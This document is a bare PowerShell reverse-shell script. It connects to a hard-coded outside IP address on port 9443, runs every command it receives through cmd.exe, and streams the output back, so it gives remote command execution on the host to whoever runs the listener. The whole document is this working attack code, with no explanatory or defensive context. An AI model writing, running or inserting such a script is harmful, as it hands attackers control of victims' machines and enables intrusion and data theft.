$client = New-Object System.Net.Sockets.TCPClient('137.1.1.44', 9443);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$writer.AutoFlush = $true;

$buffer = New-Object byte[] 1024;
$encoding = New-Object Text.ASCIIEncoding;

while(($read = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $cmd = ($encoding.GetString($buffer, 0, $read)).Trim();
    try {
        $output = (cmd.exe /c $cmd 2>&1 | Out-String);
        $writer.WriteLine($output);
        $writer.Flush();
    } catch {
        $writer.WriteLine("Error executing command: $_");
    }
}
$client.Close();
